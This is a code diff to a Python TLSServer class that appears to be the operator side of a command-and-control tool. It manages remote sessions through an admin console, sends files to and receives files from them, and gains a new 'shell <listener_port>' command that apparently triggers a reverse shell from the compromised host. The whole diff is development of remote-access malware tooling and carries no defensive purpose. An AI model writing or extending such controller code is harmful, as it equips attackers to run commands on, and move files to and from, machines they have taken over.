@@ -129,6 +129,9 @@ class TLSServer:
             elif cmd.startswith("use "):
                 self._use(cmd)
 
+            elif cmd == "ipconfig":
+                pass
+
             elif cmd == "help":
                 self._send_to_current(b"HELP: available commands coming soon\n")
 
@@ -140,7 +143,7 @@ class TLSServer:
                 self._send_to_current(cmd.encode("utf-8"))
 
             elif cmd.startswith("shell "):
-                self._send_to_current(cmd.encode("utf-8"))
+                self._shell(cmd)
 
             elif cmd == "exit":
                 logger.debug("Exiting admin console")
@@ -177,6 +180,14 @@ class TLSServer:
                 mark = "*" if sid == self.current_session else " "
                 logger.debug("%s %d %s", mark, sid, self.addresses[sid])
 
+    def _shell(self, cmd):
+        try:
+            int(cmd.split()[1])
+            self._send_to_current(cmd.encode("utf-8"))
+        except ValueError:
+            logger.debug("Usage: shell <listener_port>")
+            return
+
     def _recv_file(self, filename):
         with self.lock:
             sid = self.current_session
@@ -188,6 +199,12 @@ class TLSServer:
             self._remove_session(sid)
 
     def _send_file(self, filename):
+        import os
+
+        if not os.path.exists(filename):
+            logger.debug("File not found %s", filename)
+            return
+
         with self.lock:
             sid = self.current_session
             sock = self.sessions.get(sid)
@@ -208,7 +225,6 @@ class TLSServer:
 
         try:
             sock.sendall(data + b"\n")
-            logger.debug("[*] Sent help message to session %d", sid)
         except OSError:
             self._remove_session(sid)
 
